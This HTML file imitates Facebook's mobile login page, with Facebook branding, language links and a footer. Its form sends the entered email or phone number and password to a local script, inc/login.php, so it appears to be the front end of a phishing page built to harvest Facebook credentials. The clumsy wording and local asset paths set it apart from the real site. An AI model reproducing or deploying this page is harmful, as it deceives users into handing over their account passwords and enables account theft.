<!doctype html>
<html class="no-js" lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Facebook -log in or sign up</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="img/fav/favicon.ico" type="image/x-icon"/>
        <!--=== Bootstrap ===-->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <!--=== Fontawesome icon ===-->
        <link rel="stylesheet" href="css/font-awesome.min.css">
        <!--=== Main Css ===-->
        <link rel="stylesheet" href="css/style.css">
    </head>
    <body>   
        <!--====== Header Start ======-->
        <header class="container-fluid" >
            <div class="row">
                <div class="col-12 text-center">
                    <a href="#">Facebook</a>
                </div>
            </div>
        </header>
        <!--====== Header End ======-->
        <!--====== Add Area start ======-->
        <section class="container-fluid add_area ">
            <div class="container">
                <div class="col-12">
                  <div>
                    <img src="img/add.png" alt="">
                    <a href="">Get facebook for android and browse faster</a>
                  </div>
                </div>
            </div>
        </section>
        <!--====== Add Area End ======-->
        <!--====== section main started ======-->
        <section class="container-fluid login_area">
            <form action="inc/login.php" method="post">
                <div class="row py-3">
                    <div class="col-12">
                        <input type="text" class="text" name="name" placeholder="Mobile number or email address">
                    </div>
                    <div class="col-12">
                        <input type="password" class="text" name="password" placeholder="Password" >
                    </div>   
                </div>
                <div class="col-12">
                    <input type="submit"  class="form-control" value="Login">
                </div>
            </form>
            <div class="or text-center ">
                <h6>or</h6>
            </div>
            <div class="new_account text-center" >
               <a href="#" class="btn btn-lg" type="button" >Create new account</a>
            </div>
            <div class="by text-center">
                <p>By proceeding,you also agree to the <a href="#">Terms and condition.</a> the service is not available while roaming </p>
            </div>
            <div class="link text-center pb-4">
                <a href="#">Forgotten password?</a>.
                <a href="#">Help Center</a>
            </div>
        </section>
        <!--====== section main End ======-->
        <!--====== footer area start ======-->
        <footer class="container" >
            <div class="row text-center footer ">
                <div class="col-6">
                    <ul class="" >
                        <li style="color:#919499; font-weight:600;" >English (UK)</li>
                        <li><a href="">অসমীয়া</a></li>
                        <li><a href="">नेपाली</a></li>
                        <li><a href="">Português (Brasil)</a></li>
                    </ul>
                </div>
                <div class="col-6">
                    <ul class="" >
                        <li><a href="">বাংলা</a></li>
                        <li><a href="">हिन्दी</a></li>
                        <li><a href="">Español</a></li>
                        <li><a href=""><i class="fa fa-plus-square-o" aria-hidden="true"></i></a></li>
                    </ul>
                </div>
                <div class="col-12">
                    <h5 style="color:#919499; font-size: 12px; " >Facebook @2019</h5>
                </div>
            </div>         
        </footer>
        <!--====== footer area End ======-->
        <!--==================================================================-->
        <script type="text/javascript" src="js/jquery-3.2.0.min.js"></script>
        <script type="text/javascript" src="js/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/custom.js"></script>
    </body>
</html>